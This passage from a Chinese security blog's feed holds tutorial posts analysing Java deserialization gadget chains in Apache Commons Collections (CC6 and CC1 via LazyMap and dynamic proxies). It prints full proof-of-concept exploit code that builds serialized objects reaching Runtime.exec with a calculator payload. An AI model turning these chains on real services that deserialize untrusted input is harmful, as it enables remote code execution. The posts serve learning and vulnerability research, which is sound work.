id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><p>我们先来看看这条链子的思路，来自p神：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment"> java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment"> org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment"> java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>首先我们发现<code>HashMap</code>中的<code>readObject()</code>方法中可以调<code>hash</code>方法，而在<code>hash()</code>方法中会调用<code>key.hashCode()</code>，那我们就把需要执行<code>hashCode</code>方法的对象放在<code>key</code>位置上就好了，然后在<code>TiedMapEntry</code>中的<code>hashCode</code>方法里面会调用<code>getValue</code>方法，然后就可以触发<code>LazyMap</code>中的<code>get</code>方法，就和前面的cc1一样了，其实思路挺简单的，甚至我感觉比cc1更好理解，接下来就看poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/14/4Dtg5VCaS2njGbv.png" alt="image.png"></p><p>大家如果有读过<code>ysoserial</code>的源码会发现和我写的可能有一些不一样，因为<code>ysoserial</code>中考虑的情况可能会更多一些，在实战中能应对更多复杂的情况，但相对的，里面就会有一些不是核心的代码，这里我就把它略过了，让大家只看核心过程，更加方便理解，当然，这不是最终POC哈，只是学习这个思路，最终的POC还得看下一篇文章，下一篇文章中再来和大家介绍<code>ysoserial</code>中进行的操作，以及进行这些操作的目的，进行完这些操作之后，生成最终的POC</p><p>哈哈哈哈话说今天还是情人节 祝天下的情人们节日快乐哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-6&quot;&gt;&lt;a href=&quot;#Commons-Collections-6&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 6&quot;&gt;&lt;/a&gt;Commons Collections 6&lt;/h1&gt;&lt;p&gt;前面的三篇文章我们介绍完了cc1的链子，但朋友们不难发现，无论是&lt;code&gt;TransformedMap&lt;/code&gt;，还是&lt;code&gt;LazyMap&lt;/code&gt;，在Java高版本(8u71之后)，都不能再利用了，主要问题是出在&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;类中的，所以说我们这篇文章来介绍一条相对通用的链子，而这条链子就是&lt;code&gt;CommonsCollections6&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 1 (3)</title>
    <link href="https://arsenetang.github.io/2022/02/09/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(3)/"/>
    <id>https://arsenetang.github.io/2022/02/09/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(3)/</id>
    <published>2022-02-08T16:00:00.000Z</published>
    <updated>2022-03-13T03:26:48.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-1-3"><a href="#CommonsCollections-1-3" class="headerlink" title="CommonsCollections  1  (3)"></a>CommonsCollections  1  (3)</h1><p>这里是cc1的最后了，在<code>ysoserial</code>的源码中，它利用的是<code>LazyMap</code>而不是<code>TransformedMap</code>，其实我认为<code>TransformedMap</code>更简单也更好理解，但既然它用的是<code>LazyMap</code>那我们就来看看<code>LazyMap</code>嘛，这里就需要用到动态代理的知识了</p><span id="more"></span><h2 id="LazyMap是啥"><a href="#LazyMap是啥" class="headerlink" title="LazyMap是啥"></a>LazyMap是啥</h2><p><code>LazyMap</code>和<code>TransformedMap</code>类似，都是对map做一个修饰，都来自于Common-Collections库，并继承<code>AbstractMapDecorator</code></p><p>而<code>LazyMap</code>的漏洞触发点和<code>TransformedMap</code>唯一的差别是，<code>TransformedMap</code>是在添加新元素的时候执行<code>transform</code>，也就是<code>put</code>一个新元素的时候；而<code>LazyMap</code>是在<code>get</code>方法中执行的<code>transform</code>，因为<code>LazyMap</code>的作用是“懒加载”，当它尝试<code>get</code>一个不存在的<code>key</code>时，它会调用<code>factory.transform</code>方法去获取一个值，因为会调用<code>transform</code>，从而触发漏洞，看看它的<code>get</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个<code>factory</code>是什么呢？我们来看看<code>LazyMap</code>中的<code>decorate</code>方法和构造方法就好了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这个<code>factory</code>就是<code>decorate</code>方法的第二个参数，也就是我们传入的<code>Transformer</code>；之后的过程就和前面讲的一样了</p><p>所以说我们来本地触发一下漏洞，其实和第一篇文章的代码差不多的，只不过把<code>TransformedMap</code>改成<code>LazyMap</code>，把<code>put</code>改成<code>get</code></p><p><img src="https://s2.loli.net/2022/02/07/bvJC2PfW9xRuZmw.png" alt="image.png"></p><p>接下来我们就来把这本地测试的类改成一段反序列化的流，这里会稍微复杂一点，因为<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法中并没有直接调用map中的<code>get</code>方法，但在<code>AnnotationInvocationHandler</code>类中的<code>invoke</code>方法中有调用到<code>get</code></p><h2 id="如何调用invoke"><a href="#如何调用invoke" class="headerlink" title="如何调用invoke"></a>如何调用invoke</h2><p>那么如何调用到<code>AnnotationInvocationHandler</code>类中的<code>invoke</code>方法呢？这就需要用到我们前面说过的动态代理了，因为<code>AnnotationInvocationHandler</code>类同样是实现了<code>InvocationHandler</code>接口，那它相当于就是一个动态代理类，那我们就可以通过<code>Proxy</code>的静态方法<code>newProxyInstance</code>去动态创建代理了，而这样就可以进入到<code>invoke</code>方法中，记不太清了的话可以去看看前面的文章</p><p><code>Proxy.newProxyInstance</code> 的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们需要代理的对象集合，这里肯定是map嘛；第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，也就是代理类的对象，在这里其实就是我们前面利用反射创建的<code>AnnotationInvocationHandler</code>对象，里面有<code>invoke</code>方法，并且包含了具体代理的逻辑，这时候只要我们调用任意方法，都会进入到代理类的<code>invoke</code>方法中，进而触发漏洞，这里还是举个例子，看一个劫持：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">flag</span> </span>&#123;  <span class="comment">//接口</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> <span class="keyword">implements</span> <span class="title">flag</span> </span>&#123;  <span class="comment">//接口实现类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Give you flag: flag&#123;wllm_yyds&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;  <span class="comment">//代理类</span></span><br><span class="line">    <span class="keyword">protected</span> Object obj;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test11</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        flag flag = <span class="keyword">new</span> getflag();</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> DynamicProxy(flag); <span class="comment">//创建一个实现接口InvocationHandler的对象</span></span><br><span class="line">        flag a = (flag) Proxy.newProxyInstance(getflag.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;flag.class&#125;, handler);</span><br><span class="line">        <span class="comment">//利用Proxy类中的newProxyInstance方法动态返回代理类的一个实例</span></span><br><span class="line">        a.getflag();</span><br><span class="line">        <span class="comment">//这里我们想调用getflag方法就会直接进入到代理类的invoke方法中，进而输出success</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/09/79dWSH8c3qXimRk.png" alt="image.png"></p><p>这样就可以进入到<code>invoke</code>了，所以说代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) obj;</span><br><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>代理后的对象为<code>proxyMap</code>，这里我们不能对它直接反序列化，因为这条链子的入口依然是<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法，所以说我们再利用<code>AnnotationInvocationHandler</code>对这个<code>proxyMap</code>进行封装就好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class,proxyMap);</span><br></pre></td></tr></table></figure><h2 id="完整的链子"><a href="#完整的链子" class="headerlink" title="完整的链子"></a>完整的链子</h2><p>那我们就来看看完整的链子的思路：</p><p>首先是<code>ObjectInputStream</code>对象的<code>readObject()</code>，也就是对象流的反序列化，然后就是<code>AnnotationInvocationHandler</code>对象的<code>readObject()</code>方法，由于我们设置了代理，访问任意方法后就会进入到<code>AnnotationInvocationHandler</code>对象中的<code>invoke</code>方法，然后调用<code>LazyMap</code>中的<code>get</code>方法，进入到<code>get</code>方法那一切都好说了，然后调用<code>ChainedTransformer</code>中的<code>transform</code>方法，然后调用<code>ConstantTransformer</code>中的<code>transform</code>方法，返回<code>Runtime.class</code>对象，然后调用<code>InvokerTransformer</code>中的<code>transform</code>方法，然后利用<code>invoke</code>方法获取到<code>getMethod</code>方法，得到<code>getRuntime</code>对象，最后执行里面的<code>exec</code>方法就好了</p><p><code>ysoserial</code>给的示意图：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>所以说poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1_3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        System.out.println(<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过由于版本原因，我本地依然没有弹出计算器，切换版本之后弹出计算器：</p><p><img src="https://s2.loli.net/2022/03/13/H8bRBsEy7UoVrTg.png" alt="image.png"></p><h2 id="LazyMap和TransformedMap的对比"><a href="#LazyMap和TransformedMap的对比" class="headerlink" title="LazyMap和TransformedMap的对比"></a>LazyMap和TransformedMap的对比</h2><p>前面详细分析了<code>LazyMap</code>的用法并且构造了poc，但是<code>LazyMap</code>仍然无法解决<code>CommonCollections1</code>在Java高版本(8u71以后)中的使用问题</p><p><code>LazyMap</code>的漏洞触发在<code>get</code>和<code>invoke</code>中，完全没有<code>setValue</code>什么事，这也说明8u71后不能利用的原因和<code>AnnotationInvocationHandler#readObject</code>中有没有<code>setValue</code>没任何关系，主要还是跟逻辑有关系，主要它会新建一个<code>map</code>对象，而没有用我们构造的那个map了</p><p>只不过我还是认为<code>TransformedMap</code>用起来更加方便一点，不太明白为啥<code>ysoserial</code>要使用<code>LazyMap</code></p><p>参考文章：</p><p><a href="https://y4tacker.blog.csdn.net/article/details/117448761">https://y4tacker.blog.csdn.net/article/details/117448761</a></p><p><a href="https://fmyyy.gitee.io/2021/09/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-3/">https://fmyyy.gitee.io/2021/09/03/java反序列化CC1-3/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CommonsCollections-1-3&quot;&gt;&lt;a href=&quot;#CommonsCollections-1-3&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections  1  (3)&quot;&gt;&lt;/a&gt;CommonsCollections  1  (3)&lt;/h1&gt;&lt;p&gt;这里是cc1的最后了，在&lt;code&gt;ysoserial&lt;/code&gt;的源码中，它利用的是&lt;code&gt;LazyMap&lt;/code&gt;而不是&lt;code&gt;TransformedMap&lt;/code&gt;，其实我认为&lt;code&gt;TransformedMap&lt;/code&gt;更简单也更好理解，但既然它用的是&lt;code&gt;LazyMap&lt;/code&gt;那我们就来看看&lt;code&gt;LazyMap&lt;/code&gt;嘛，这里就需要用到动态代理的知识了&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 1 (2)</title>
    <link href="https://arsenetang.github.io/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/"/>
    <id>https://arsenetang.github.io/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/</id>
    <published>2022-02-05T16:00:00.000Z</published>
    <updated>2022-03-13T03:36:11.185Z</updated>
    
